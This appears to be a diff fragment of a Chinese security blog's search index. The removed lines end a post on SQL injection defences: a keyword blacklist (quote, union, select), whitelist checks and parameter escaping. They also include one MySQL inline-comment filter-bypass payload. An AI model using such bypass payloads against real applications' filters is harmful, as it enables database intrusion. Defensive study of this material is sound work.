-<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
-<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
-<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
-<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
-<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
-<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>Mysql爆破语句</tag>
-        <tag>注入绕过</tag>
-        <tag>sql注入技巧</tag>
-        <tag>sql注入防御</tag>
       </tags>
   </entry>
   <entry>
@@ -20740,12 +20798,12 @@ return $outText;#新值
         <tag>linux</tag>
         <tag>爬虫</tag>
         <tag>应急响应</tag>
+        <tag>webshell</tag>
         <tag>网安</tag>
         <tag>前端跨域</tag>
         <tag>APT</tag>
         <tag>javascript</tag>
         <tag>风险评估</tag>
-        <tag>webshell</tag>
         <tag>安全加固</tag>
         <tag>DDOS</tag>
         <tag>shell/webshell</tag>
